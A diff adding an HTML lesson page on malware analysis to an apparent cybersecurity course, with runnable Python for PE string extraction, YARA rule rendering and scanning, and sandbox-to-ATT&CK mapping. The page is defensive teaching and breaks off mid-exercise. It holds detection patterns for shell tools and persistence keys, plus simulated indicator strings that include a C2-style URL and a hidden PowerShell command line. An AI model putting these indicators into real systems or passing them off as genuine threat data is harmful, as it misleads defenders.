@@ -1,0 +1,1500 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 18 — Malware Analysis</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 18 — Malware Analysis</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="18" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 18 — Malware Analysis</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 5 — IR &amp; Forensics</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Malware Analysis domain / SC-200: Threat investigation / GCIA: Malware indicators</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>2 YARA rules + yara-python integration into the detection pipeline</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W17 Digital Forensics, W13 Endpoint EDR, W06 Offensive Techniques</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Static Analysis</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="18-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=vQPz3QFDR3c" target="_blank" rel="noopener"><b>Malware Analysis Bootcamp - Understanding The PE Header</b><small>HackerSploit</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=malware%20static%20analysis%20PE%20header%20strings%20YARA%20beginner%20tutorial" target="_blank" rel="noopener">malware static analysis PE header strings YARA beginner tutorial</a></p></div>
+<hr />
+<h3>Concept 1 — The PE File Format</h3>
+<p>Every Windows executable is a Portable Executable (PE) file. Understanding the structure lets you extract indicators without running the malware.</p>
+<p>Key sections:</p>
+<ul>
+<li><strong>MZ header</strong> — magic bytes <code>4D 5A</code> at offset 0 (every PE starts here)</li>
+<li><strong>PE header</strong> — machine type, timestamp, number of sections</li>
+<li><strong>Section table</strong> — <code>.text</code> (code), <code>.data</code> (globals), <code>.rdata</code> (read-only data, strings), <code>.rsrc</code> (resources), <code>.reloc</code> (base relocations)</li>
+<li><strong>Import table</strong> — DLLs and functions the file calls: <code>CreateRemoteThread</code>, <code>VirtualAlloc</code>, <code>WriteProcessMemory</code> = injection; <code>CryptEncrypt</code>, <code>InternetOpenUrl</code> = ransomware + C2</li>
+<li><strong>Export table</strong> — functions this file exposes (DLLs only)</li>
+<li><strong>Strings</strong> — ASCII/Unicode strings embedded in the binary: URLs, registry keys, mutex names, file paths</li>
+</ul>
+<p><strong>Analogy:</strong> A PE file is like a Python wheel package — it has a manifest (PE header), code sections (the <code>.py</code> files), and a dependency list (import table). Static analysis is reading the wheel's <code>METADATA</code> and <code>RECORD</code> files without running <code>pip install</code>.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from typing import Optional
+import struct
+import re
+
+@dataclass
+class PESection:
+    name: str
+    virtual_address: int
+    virtual_size: int
+    raw_size: int
+    characteristics: int
+
+    def is_executable(self) -&gt; bool:
+        return bool(self.characteristics &amp; 0x20000000)
+
+    def is_writable(self) -&gt; bool:
+        return bool(self.characteristics &amp; 0x80000000)
+
+    def entropy(self, data: bytes) -&gt; float:
+        import math
+        from collections import Counter
+        if not data:
+            return 0.0
+        freq = Counter(data)
+        total = len(data)
+        return -sum((c / total) * math.log2(c / total) for c in freq.values())
+
+@dataclass
+class PEImport:
+    dll_name: str
+    function_name: str
+
+@dataclass
+class StaticAnalysisResult:
+    filename: str
+    md5: str
+    sha256: str
+    file_size: int
+    is_pe: bool
+    compile_timestamp: Optional[str]
+    sections: list[PESection]
+    imports: list[PEImport]
+    strings_extracted: list[str]
+    suspicious_imports: list[str] = field(default_factory=list)
+    suspicious_strings: list[str] = field(default_factory=list)
+
+    def _assess_imports(self) -&gt; None:
+        suspicious = {
+            &quot;VirtualAlloc&quot;, &quot;VirtualAllocEx&quot;, &quot;WriteProcessMemory&quot;,
+            &quot;CreateRemoteThread&quot;, &quot;NtUnmapViewOfSection&quot;,
+            &quot;SetWindowsHookEx&quot;, &quot;GetAsyncKeyState&quot;,
+            &quot;CryptEncrypt&quot;, &quot;CryptGenKey&quot;,
+            &quot;InternetOpenUrl&quot;, &quot;InternetReadFile&quot;,
+            &quot;WNetAddConnection2&quot;,
+        }
+        self.suspicious_imports = [
+            f&quot;{i.dll_name}!{i.function_name}&quot;
+            for i in self.imports
+            if i.function_name in suspicious
+        ]
+
+    def _assess_strings(self) -&gt; None:
+        patterns = [
+            (r&quot;https?://\S+&quot;,              &quot;URL&quot;),
+            (r&quot;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+&quot;, &quot;IP:port&quot;),
+            (r&quot;cmd\.exe|powershell\.exe&quot;,  &quot;shell reference&quot;),
+            (r&quot;\\AppData\\&quot;,               &quot;user temp path&quot;),
+            (r&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &quot;persistence key&quot;),
+        ]
+        self.suspicious_strings = []
+        for s in self.strings_extracted:
+            for pattern, label in patterns:
+                if re.search(pattern, s, re.IGNORECASE):
+                    self.suspicious_strings.append(f&quot;[{label}] {s}&quot;)
+                    break
+
+    def assess(self) -&gt; &quot;StaticAnalysisResult&quot;:
+        self._assess_imports()
+        self._assess_strings()
+        return self
+
+    def risk_score(self) -&gt; int:
+        return len(self.suspicious_imports) * 2 + len(self.suspicious_strings)
+
+def extract_strings(data: bytes, min_length: int = 6) -&gt; list[str]:
+    &quot;&quot;&quot;Extract printable ASCII and UTF-16LE strings from raw bytes.&quot;&quot;&quot;
+    ascii_pat  = re.compile(rb&quot;[\x20-\x7e]{&quot; + str(min_length).encode() + rb&quot;,}&quot;)
+    utf16_pat  = re.compile(rb&quot;(?:[\x20-\x7e]\x00){&quot; + str(min_length).encode() + rb&quot;,}&quot;)
+    ascii_hits  = [m.group().decode(&quot;ascii&quot;, errors=&quot;replace&quot;) for m in ascii_pat.finditer(data)]
+    utf16_hits  = [m.group().decode(&quot;utf-16-le&quot;, errors=&quot;replace&quot;) for m in utf16_pat.finditer(data)]
+    return ascii_hits + utf16_hits
+
+SIMULATED_PE_DATA = (
+    b&quot;MZ&quot; + b&quot;\x00&quot; * 60 +                          # MZ header stub
+    b&quot;PE\x00\x00&quot; +                                  # PE signature
+    b&quot;CreateRemoteThread\x00&quot; +
+    b&quot;VirtualAllocEx\x00&quot; +
+    b&quot;WriteProcessMemory\x00&quot; +
+    b&quot;http://185.220.101.5:8080/gate.php\x00&quot; +
+    b&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00&quot; +
+    b&quot;powershell.exe -WindowStyle Hidden\x00&quot; +
+    b&quot;\\AppData\\Local\\Temp\\update.exe\x00&quot; +
+    b&quot;\x00&quot; * 512
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Using <code>SIMULATED_PE_DATA</code>:</p>
+<ol>
+<li>Call <code>extract_strings()</code> to get the string list</li>
+<li>Build a <code>StaticAnalysisResult</code> with the extracted strings and the imports listed below</li>
+<li>Call <code>.assess()</code> then print <code>risk_score()</code>, <code>suspicious_imports</code>, and <code>suspicious_strings</code></li>
+</ol>
+<p>Expected output:</p>
+<pre><code>Risk score: 10
+Suspicious imports (3): kernel32.dll!CreateRemoteThread, kernel32.dll!VirtualAllocEx, kernel32.dll!WriteProcessMemory
+Suspicious strings (4):
+  [URL] http://185.220.101.5:8080/gate.php
+  [persistence key] SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  [shell reference] powershell.exe -WindowStyle Hidden
+  [user temp path] \AppData\Local\Temp\update.exe
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import hashlib
+pe_data = SIMULATED_PE_DATA
+pe_imports = [
+    PEImport(&quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot;),
+    PEImport(&quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot;),
+    PEImport(&quot;kernel32.dll&quot;, &quot;WriteProcessMemory&quot;),
+    PEImport(&quot;kernel32.dll&quot;, &quot;Sleep&quot;),
+    PEImport(&quot;ws2_32.dll&quot;,   &quot;connect&quot;),
+]
+pe_sha256 = hashlib.sha256(pe_data).hexdigest()
+pe_md5    = hashlib.md5(pe_data).hexdigest()
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 2 — Writing YARA Rules</h3>
+<p>YARA is the standard pattern-matching language for malware. A YARA rule has three sections: <code>meta</code> (documentation), <code>strings</code> (patterns to match), <code>condition</code> (logic combining the strings).</p>
+<p>String types:</p>
+<ul>
+<li>Plain text: <code>&quot;CreateRemoteThread&quot;</code></li>
+<li>Hex: <code>{ 4D 5A 90 00 }</code> — byte sequences (wildcards: <code>?? ??</code>)</li>
+<li>Regex: <code>/https?:\/\/[0-9]{1,3}\.[0-9]{1,3}/</code></li>
+</ul>
+<p>Modifiers: <code>nocase</code>, <code>wide</code> (UTF-16), <code>fullword</code>, <code>ascii</code></p>
+<p>Condition keywords: <code>all of them</code>, <code>any of them</code>, <code>2 of ($string*)</code>, <code>filesize &lt; 500KB</code>, <code>uint16(0) == 0x5A4D</code> (PE check at offset 0).</p>
+<p><strong>Analogy:</strong> A YARA rule is like a SQL <code>WHERE</code> clause on binary data — the <code>strings</code> block defines columns to check, the <code>condition</code> block is the filter predicate.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from dataclasses import dataclass
+from typing import Optional
+
+@dataclass
+class YARAString:
+    identifier: str    # e.g. &quot;$mz_header&quot;
+    value: str         # plain text, hex {..}, or /regex/
+    modifiers: list[str] = None   # [&quot;nocase&quot;, &quot;wide&quot;, &quot;ascii&quot;]
+
+    def __post_init__(self):
+        if self.modifiers is None:
+            self.modifiers = []
+
+    def render(self) -&gt; str:
+        mods = &quot; &quot;.join(self.modifiers)
+        return f&#x27;        {self.identifier} = {self.value}&#x27; + (f&quot; {mods}&quot; if mods else &quot;&quot;)
+
+@dataclass
+class YARARule:
+    name: str
+    meta: dict[str, str]
+    strings: list[YARAString]
+    condition: str
+    tags: list[str] = None
+
+    def __post_init__(self):
+        if self.tags is None:
+            self.tags = []
+
+    def render(self) -&gt; str:
+        tag_str = &quot; : &quot; + &quot; &quot;.join(self.tags) if self.tags else &quot;&quot;
+        lines = [f&quot;rule {self.name}{tag_str}&quot;, &quot;{&quot;]
+        lines.append(&quot;    meta:&quot;)
+        for k, v in self.meta.items():
+            lines.append(f&#x27;        {k} = &quot;{v}&quot;&#x27;)
+        lines.append(&quot;    strings:&quot;)
+        for s in self.strings:
+            lines.append(s.render())
+        lines.append(&quot;    condition:&quot;)
+        lines.append(f&quot;        {self.condition}&quot;)
+        lines.append(&quot;}&quot;)
+        return &quot;\n&quot;.join(lines)
+
+    def validate(self) -&gt; list[str]:
+        errors = []
+        if not self.name.replace(&quot;_&quot;, &quot;&quot;).isalnum():
+            errors.append(f&quot;Rule name &#x27;{self.name}&#x27; contains invalid characters&quot;)
+        if not self.condition.strip():
+            errors.append(&quot;Condition is empty&quot;)
+        for s in self.strings:
+            if not s.identifier.startswith(&quot;$&quot;):
+                errors.append(f&quot;String identifier &#x27;{s.identifier}&#x27; must start with $&quot;)
+        if &quot;1 of them&quot; in self.condition and len(self.strings) == 1:
+            errors.append(&quot;&#x27;1 of them&#x27; with only 1 string — use the identifier directly&quot;)
+        return errors
+
+HOLLOW_INJECTOR_RULE = YARARule(
+    name=&quot;Hollow_Process_Injector&quot;,
+    tags=[&quot;T1055_012&quot;, &quot;injection&quot;],
+    meta={
+        &quot;description&quot;: &quot;Detects process hollowing injector with NtUnmapViewOfSection + VirtualAllocEx&quot;,
+        &quot;author&quot;:      &quot;Detection Engineer&quot;,
+        &quot;date&quot;:        &quot;2024-01-15&quot;,
+        &quot;hash&quot;:        &quot;example-sha256&quot;,
+        &quot;reference&quot;:   &quot;T1055.012&quot;,
+    },
+    strings=[
+        YARAString(&quot;$unmap&quot;,  &#x27;&quot;NtUnmapViewOfSection&quot;&#x27;),
+        YARAString(&quot;$valloc&quot;, &#x27;&quot;VirtualAllocEx&quot;&#x27;),
+        YARAString(&quot;$wpm&quot;,    &#x27;&quot;WriteProcessMemory&quot;&#x27;),
+        YARAString(&quot;$crt&quot;,    &#x27;&quot;CreateRemoteThread&quot;&#x27;),
+        YARAString(&quot;$mz&quot;,     &quot;{ 4D 5A }&quot;),
+    ],
+    condition=&quot;uint16(0) == 0x5A4D and 3 of ($unmap, $valloc, $wpm, $crt)&quot;,
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>HOLLOW_INJECTOR_RULE.render()</code> and print the full YARA rule text. Then call <code>validate()</code> — it should return no errors. Finally, add a new <code>YARAString</code> with an invalid identifier (missing <code>$</code>) and confirm <code>validate()</code> catches it.</p>
+<p>Expected output:</p>
+<pre><code>rule Hollow_Process_Injector : T1055_012 injection
+{
+    meta:
+        description = &quot;Detects process hollowing injector...&quot;
+        ...
+    strings:
+        $unmap = &quot;NtUnmapViewOfSection&quot;
+        $valloc = &quot;VirtualAllocEx&quot;
+        ...
+    condition:
+        uint16(0) == 0x5A4D and 3 of ($unmap, $valloc, $wpm, $crt)
+}
+Validation errors (clean): []
+Validation errors (bad string): [&quot;String identifier &#x27;bad_string&#x27; must start with $&quot;]
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>rule_input = HOLLOW_INJECTOR_RULE
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 3 — Running YARA with yara-python</h3>
+<p><code>yara-python</code> compiles YARA rules and scans data (files or byte strings). Install: <code>pip install yara-python</code>.</p>
+<p>Key API:</p>
+<ul>
+<li><code>yara.compile(source=rule_text)</code> or <code>yara.compile(filepath=path)</code> → <code>Rules</code> object</li>
+<li><code>rules.match(filepath=path)</code> or <code>rules.match(data=bytes_object)</code> → <code>list[Match]</code></li>
+<li><code>Match.rule</code> — rule name; <code>Match.strings</code> — <code>[(offset, identifier, data)]</code></li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import yara
+from dataclasses import dataclass
+from typing import Optional
+
+@dataclass
+class YARAMatch:
+    rule_name: str
+    tags: list[str]
+    meta: dict
+    matches: list[dict]   # [{&quot;offset&quot;: int, &quot;identifier&quot;: str, &quot;data&quot;: bytes}]
+
+    def summary(self) -&gt; str:
+        hit_ids = [m[&quot;identifier&quot;] for m in self.matches]
+        return f&quot;{self.rule_name} ({len(self.matches)} hits: {&#x27;, &#x27;.join(hit_ids)})&quot;
+
+def compile_and_scan(rule_text: str, data: bytes) -&gt; list[YARAMatch]:
+    try:
+        rules = yara.compile(source=rule_text)
+    except yara.SyntaxError as exc:
+        raise ValueError(f&quot;YARA syntax error: {exc}&quot;)
+
+    raw_matches = rules.match(data=data)
+    results = []
+    for m in raw_matches:
+        matches = [
+            {&quot;offset&quot;: offset, &quot;identifier&quot;: identifier.decode() if isinstance(identifier, bytes) else identifier,
+             &quot;data&quot;: string_data}
+            for offset, identifier, string_data in m.strings
+        ]
+        results.append(YARAMatch(
+            rule_name=m.rule,
+            tags=list(m.tags),
+            meta=dict(m.meta),
+            matches=matches,
+        ))
+    return results
+
+def scan_file(rule_text: str, filepath: str) -&gt; list[YARAMatch]:
+    try:
+        rules = yara.compile(source=rule_text)
+        raw_matches = rules.match(filepath=filepath)
+        return [
+            YARAMatch(
+                rule_name=m.rule,
+                tags=list(m.tags),
+                meta=dict(m.meta),
+                matches=[
+                    {&quot;offset&quot;: o, &quot;identifier&quot;: i.decode() if isinstance(i, bytes) else i, &quot;data&quot;: d}
+                    for o, i, d in m.strings
+                ],
+            )
+            for m in raw_matches
+        ]
+    except Exception as exc:
+        print(f&quot;[ERROR] scan_file: {exc}&quot;)
+        return []
+
+MINIMAL_YARA_RULE = &quot;&quot;&quot;
+rule Hollow_Process_Injector : T1055_012
+{
+    meta:
+        description = &quot;Detects process hollowing injector&quot;
+        author      = &quot;Detection Engineer&quot;
+        date        = &quot;2024-01-15&quot;
+        reference   = &quot;T1055.012&quot;
+    strings:
+        $unmap  = &quot;NtUnmapViewOfSection&quot;
+        $valloc = &quot;VirtualAllocEx&quot;
+        $wpm    = &quot;WriteProcessMemory&quot;
+        $crt    = &quot;CreateRemoteThread&quot;
+    condition:
+        3 of ($unmap, $valloc, $wpm, $crt)
+}
+&quot;&quot;&quot;
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>compile_and_scan(MINIMAL_YARA_RULE, SIMULATED_PE_DATA)</code>. Print each match's <code>summary()</code>. Then modify <code>SIMULATED_PE_DATA</code> to remove one suspicious import and confirm the rule no longer fires (only 2 of 4 strings match).</p>
+<p>Expected output:</p>
+<pre><code>MATCH: Hollow_Process_Injector (3 hits: $valloc, $wpm, $crt)
+
+After removing CreateRemoteThread (2 hits): no match (below threshold of 3)
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>rule_text = MINIMAL_YARA_RULE
+data_full    = SIMULATED_PE_DATA
+data_partial = SIMULATED_PE_DATA.replace(b&quot;VirtualAllocEx\x00&quot;, b&quot;\x00&quot; * 15)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can generate YARA rule skeletons from malware reports or VirusTotal analysis, accelerating rule authoring from hours to minutes.
+<strong>Threat:</strong> Attackers use LLMs to generate polymorphic code variants that change byte patterns every build, defeating static YARA rules.
+<strong>Opportunity:</strong> Paste a malware analysis blog post into an LLM and ask it to extract candidate strings, hex patterns, and import combinations, then generate a YARA rule skeleton — analyst reviews and refines.
+<strong>Prompt to try:</strong> <code>&quot;Read this malware analysis report [paste report]. Extract: (1) unique strings suitable for YARA, (2) suspicious Windows API imports, (3) any hex byte sequences described. Then generate a YARA rule with meta, strings, and condition sections. Use 'any of them' if uncertain about prevalence.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Dynamic Analysis</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="18-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=lyBmNALZO1w" target="_blank" rel="noopener"><b>How to use Interactive Malware Sandbox -- ANY.RUN Tutorial</b><small>ANY.RUN</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=malware%20dynamic%20analysis%20sandbox%20cuckoo%20any.run%20behavior%20monitoring" target="_blank" rel="noopener">malware dynamic analysis sandbox cuckoo any.run behavior monitoring</a></p></div>
+<hr />
+<h3>Concept 1 — Behavioral Analysis Fundamentals</h3>
+<p>Dynamic analysis runs the malware in a controlled environment and monitors what it does. The four observation planes:</p>
+<ol>
+<li><strong>Process</strong> — new processes created, injected threads, parent-child relationships</li>
+<li><strong>File</strong> — files created, deleted, modified (especially in startup folders, Temp, System32)</li>
+<li><strong>Registry</strong> — keys read/written (persistence: Run keys, services; credential theft: SAM, LSA secrets)</li>
+<li><strong>Network</strong> — DNS queries, HTTP/S connections, raw TCP/UDP (C2 beaconing)</li>
+</ol>
+<p>Sandboxes (Any.run, Cuckoo, CAPE, VMRay) automate observation and produce a behavioral report. The output maps directly to ATT&amp;CK techniques.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from datetime import datetime
+from typing import Optional
+from enum import Enum
+
+class BehaviorCategory(Enum):
+    PROCESS        = &quot;process&quot;
+    FILE           = &quot;file&quot;
+    REGISTRY       = &quot;registry&quot;
+    NETWORK        = &quot;network&quot;
+    MUTEX          = &quot;mutex&quot;
+    SERVICE        = &quot;service&quot;
+    MEMORY         = &quot;memory&quot;
+
+@dataclass
+class BehaviorEvent:
+    timestamp_ms: int          # milliseconds from sample start
+    category: BehaviorCategory
+    operation: str             # &quot;create&quot;, &quot;write&quot;, &quot;read&quot;, &quot;delete&quot;, &quot;connect&quot;
+    target: str                # file path, registry key, IP:port, process name
+    pid: int
+    process_name: str
+    technique_id: Optional[str] = None
+    details: dict = field(default_factory=dict)
+
+@dataclass
+class SandboxReport:
+    sample_md5: str
+    sample_sha256: str
+    filename: str
+    analysis_start: datetime
+    platform: str              # &quot;Windows 10 x64&quot;
+    sandbox: str               # &quot;CAPEv2&quot;, &quot;Any.run&quot;, &quot;Cuckoo&quot;
+    verdict: str               # &quot;malicious&quot;, &quot;suspicious&quot;, &quot;clean&quot;
+    malware_family: Optional[str]
+    events: list[BehaviorEvent] = field(default_factory=list)
+    network_iocs: list[str] = field(default_factory=list)
+    file_iocs: list[str] = field(default_factory=list)
+    registry_iocs: list[str] = field(default_factory=list)
+    mitre_techniques: list[str] = field(default_factory=list)
+
+    def events_by_category(self, cat: BehaviorCategory) -&gt; list[BehaviorEvent]:
+        return [e for e in self.events if e.category == cat]
+
+    def persistence_indicators(self) -&gt; list[BehaviorEvent]:
+        persistence_paths = [
+            r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;,
+            r&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;,
+            r&quot;\Startup\\&quot;,
+            r&quot;\Start Menu\Programs\Startup\\&quot;,
+            &quot;schtasks&quot;, &quot;sc create&quot;,
+        ]
+        results = []
+        for ev in self.events:
+            if any(p.lower() in ev.target.lower() for p in persistence_paths):
+                results.append(ev)
+        return results
+
+    def c2_summary(self) -&gt; list[str]:
+        network_events = self.events_by_category(BehaviorCategory.NETWORK)
+        seen = set()
+        result = []
+        for ev in network_events:
+            if ev.target not in seen:
+                seen.add(ev.target)
+                result.append(ev.target)
+        return result
+
+SAMPLE_SANDBOX_EVENTS = [
+    BehaviorEvent(100,  BehaviorCategory.PROCESS,  &quot;create&quot;,  &quot;svchost.exe&quot;,               1234, &quot;malware.exe&quot;, &quot;T1055.012&quot;),
+    BehaviorEvent(200,  BehaviorCategory.FILE,     &quot;create&quot;,  r&quot;C:\Users\user\AppData\Local\Temp\tmprefl.dll&quot;, 1234, &quot;malware.exe&quot;),
+    BehaviorEvent(300,  BehaviorCategory.REGISTRY, &quot;write&quot;,   r&quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater&quot;, 1234, &quot;malware.exe&quot;, &quot;T1547.001&quot;),
+    BehaviorEvent(400,  BehaviorCategory.NETWORK,  &quot;connect&quot;, &quot;185.220.101.5:8080&quot;,         1234, &quot;malware.exe&quot;, &quot;T1071.001&quot;),
+    BehaviorEvent(500,  BehaviorCategory.NETWORK,  &quot;connect&quot;, &quot;185.220.101.5:8080&quot;,         1234, &quot;malware.exe&quot;),
+    BehaviorEvent(600,  BehaviorCategory.NETWORK,  &quot;connect&quot;, &quot;185.220.101.5:8080&quot;,         1234, &quot;malware.exe&quot;),
+    BehaviorEvent(800,  BehaviorCategory.MUTEX,    &quot;create&quot;,  &quot;Global\\MalwareMutex123&quot;,    1234, &quot;malware.exe&quot;),
+    BehaviorEvent(900,  BehaviorCategory.FILE,     &quot;write&quot;,   r&quot;C:\Windows\Temp\beacon.dat&quot;,1234, &quot;malware.exe&quot;),
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Build a <code>SandboxReport</code> using <code>SAMPLE_SANDBOX_EVENTS</code>. Call <code>persistence_indicators()</code> and <code>c2_summary()</code>. Print all persistence findings and the unique C2 endpoints.</p>
+<p>Expected output:</p>
+<pre><code>Persistence indicators (1):
+  [registry] write → HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater (T1547.001)
+
+C2 endpoints (1):
+  185.220.101.5:8080
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>report = SandboxReport(
+    sample_md5=&quot;abc123&quot;, sample_sha256=&quot;def456&quot;,
+    filename=&quot;malware.exe&quot;,
+    analysis_start=datetime(2024, 1, 15, 10, 0, 0),
+    platform=&quot;Windows 10 x64&quot;, sandbox=&quot;CAPEv2&quot;,
+    verdict=&quot;malicious&quot;, malware_family=&quot;AsyncRAT&quot;,
+    events=SAMPLE_SANDBOX_EVENTS,
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 2 — Mapping Behaviors to ATT&amp;CK</h3>
+<p>Every sandbox event maps to an ATT&amp;CK technique. Building this mapping automatically accelerates reporting and feeds the detection backlog.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+
+BEHAVIOR_TO_TECHNIQUE: dict[tuple[BehaviorCategory, str, str], str] = {
+    (BehaviorCategory.PROCESS,  &quot;create&quot;,  &quot;cmd.exe&quot;):                    &quot;T1059.003&quot;,
+    (BehaviorCategory.PROCESS,  &quot;create&quot;,  &quot;powershell.exe&quot;):             &quot;T1059.001&quot;,
+    (BehaviorCategory.PROCESS,  &quot;inject&quot;,  &quot;*&quot;):                          &quot;T1055&quot;,
+    (BehaviorCategory.REGISTRY, &quot;write&quot;,   &quot;currentversion\\run&quot;):        &quot;T1547.001&quot;,
+    (BehaviorCategory.REGISTRY, &quot;write&quot;,   &quot;winlogon&quot;):                   &quot;T1547.004&quot;,
+    (BehaviorCategory.FILE,     &quot;create&quot;,  &quot;\\startup\\&quot;):                &quot;T1547.001&quot;,
+    (BehaviorCategory.NETWORK,  &quot;connect&quot;, &quot;*&quot;):                          &quot;T1071&quot;,
+    (BehaviorCategory.SERVICE,  &quot;create&quot;,  &quot;*&quot;):                          &quot;T1543.003&quot;,
+    (BehaviorCategory.MEMORY,   &quot;inject&quot;,  &quot;*&quot;):                          &quot;T1055&quot;,
+}
+
+def auto_tag_technique(event: BehaviorEvent) -&gt; Optional[str]:
+    if event.technique_id:
+        return event.technique_id
+    target_lower = event.target.lower()
+    for (cat, op, target_pattern), technique in BEHAVIOR_TO_TECHNIQUE.items():
+        if event.category != cat:
+            continue
+        if op != &quot;*&quot; and event.operation != op:
+            continue
+        if target_pattern != &quot;*&quot; and target_pattern not in target_lower:
+            continue
+        return technique
+    return None
+
+@dataclass
+class TechniqueHit:
+    technique_id: str
+    events: list[BehaviorEvent]
+    first_seen_ms: int
+    count: int
+
+def build_technique_matrix(events: list[BehaviorEvent]) -&gt; dict[str, TechniqueHit]:
+    matrix: dict[str, TechniqueHit] = {}
+    for ev in events:
+        tech = auto_tag_technique(ev)
+        if tech is None:
+            continue
+        if tech not in matrix:
+            matrix[tech] = TechniqueHit(tech, [], ev.timestamp_ms, 0)
+        matrix[tech].events.append(ev)
+        matrix[tech].count += 1
+    return matrix
+
+def print_technique_matrix(matrix: dict[str, TechniqueHit]) -&gt; None:
+    print(f&quot;{&#x27;Technique&#x27;:&lt;15} {&#x27;Count&#x27;:&gt;5}  {&#x27;First seen (ms)&#x27;:&gt;16}  Categories&quot;)
+    print(&quot;-&quot; * 70)
+    for tech_id, hit in sorted(matrix.items()):
+        cats = &quot;, &quot;.join(sorted({e.category.value for e in hit.events}))
+        print(f&quot;{tech_id:&lt;15} {hit.count:&gt;5}  {hit.first_seen_ms:&gt;16}  {cats}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>build_technique_matrix(SAMPLE_SANDBOX_EVENTS)</code> and <code>print_technique_matrix()</code>. The matrix should show at least T1055.012, T1547.001, and T1071.001 with their event counts.</p>
+<p>Expected output:</p>
+<pre><code>Technique       Count   First seen (ms)  Categories
+----------------------------------------------------------------------
+T1055.012           1               100  process
+T1071               2               500  network
+T1071.001           1               400  network
+T1547.001           1               300  registry
